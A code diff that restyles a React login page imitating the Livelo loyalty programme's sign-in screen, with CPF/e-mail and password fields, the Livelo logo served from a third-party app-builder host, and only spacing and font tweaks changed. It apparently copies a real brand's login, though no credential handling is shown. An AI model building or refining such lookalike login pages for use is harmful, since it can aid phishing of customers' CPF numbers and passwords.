@@ -50,19 +50,19 @@ function App() {
   };
 
   return (
-    <div className="App min-h-screen bg-white flex flex-col">
-      <div className="flex-1 flex flex-col items-center justify-center px-4">
+    <div className="App min-h-screen bg-white flex flex-col font-inter">
+      <div className="flex-1 flex flex-col items-center pt-16 px-4">
         {/* Logo */}
-        <div className="mb-8">
+        <div className="mb-10">
           <img 
             src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
             alt="Livelo Logo" 
-            className="h-12 w-auto"
+            className="h-10 w-auto"
           />
         </div>
 
         {/* Título */}
-        <h2 className="text-2xl font-bold text-gray-800 mb-8">
+        <h2 className="text-xl font-bold text-gray-900 mb-8">
           Entre com sua conta Livelo
         </h2>
 
@@ -91,7 +91,7 @@ function App() {
               value={credential}
               onChange={handleCredentialChange}
               placeholder="CPF ou E-mail"
-              className="w-full pl-12 pr-4 py-4 border-2 border-gray-200 rounded-lg focus:outline-none focus:border-pink-500 transition-colors"
+              className="w-full pl-12 pr-4 py-3.5 border-2 border-gray-200 rounded-lg focus:outline-none focus:border-pink-500 transition-colors text-base"
               data-testid="credential-input"
             />
           </div>
@@ -119,7 +119,7 @@ function App() {
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               placeholder="Senha"
-              className="w-full pl-12 pr-12 py-4 border-2 border-gray-200 rounded-lg focus:outline-none focus:border-pink-500 transition-colors"
+              className="w-full pl-12 pr-12 py-3.5 border-2 border-gray-200 rounded-lg focus:outline-none focus:border-pink-500 transition-colors text-base"
               data-testid="password-input"
             />
             <button
@@ -169,10 +169,10 @@ function App() {
           </div>
 
           {/* Link Esqueceu a senha */}
-          <div className="text-left">
+          <div className="text-left pt-1">
             <a
               href="#"
-              className="text-pink-500 hover:text-pink-600 font-medium text-sm transition-colors"
+              className="text-pink-500 hover:text-pink-600 text-sm transition-colors underline"
               data-testid="forgot-password-link"
             >
               Esqueceu sua senha?
@@ -183,9 +183,9 @@ function App() {
           <button
             type="submit"
             disabled={!isValid || isLoading}
-            className={`w-full py-4 rounded-full font-semibold text-lg transition-all duration-300 ${
+            className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 mt-6 ${
               isValid && !isLoading
-                ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-lg hover:shadow-xl transform hover:scale-105"
+                ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
                 : "bg-gray-200 text-gray-400 cursor-not-allowed"
             }`}
             data-testid="login-button"
@@ -193,7 +193,7 @@ function App() {
             {isLoading ? (
               <div className="flex items-center justify-center">
                 <svg
-                  className="animate-spin h-6 w-6 text-white"
+                  className="animate-spin h-5 w-5 text-white"
                   xmlns="http://www.w3.org/2000/svg"
                   fill="none"
                   viewBox="0 0 24 24"
@@ -222,11 +222,11 @@ function App() {
         </form>
 
         {/* Criar conta */}
-        <div className="mt-8 text-center">
-          <p className="text-gray-600 mb-2">Ainda não tem conta?</p>
+        <div className="mt-10 text-center">
+          <p className="text-gray-600 text-sm mb-1">Ainda não tem conta?</p>
           <a
             href="#"
-            className="text-pink-500 hover:text-pink-600 font-semibold transition-colors underline"
+            className="text-pink-500 hover:text-pink-600 text-sm font-medium transition-colors underline"
             data-testid="create-account-link"
           >
             Crie sua conta Livelo
@@ -238,12 +238,12 @@ function App() {
       <div className="p-8">
         <a
           href="#"
-          className="flex items-center text-gray-600 hover:text-gray-800 transition-colors"
+          className="flex items-center text-gray-600 hover:text-gray-800 text-sm transition-colors"
           data-testid="back-to-home-link"
         >
           <svg
             xmlns="http://www.w3.org/2000/svg"
-            className="h-5 w-5 mr-2"
+            className="h-4 w-4 mr-2"
             fill="none"
             viewBox="0 0 24 24"
             stroke="currentColor"
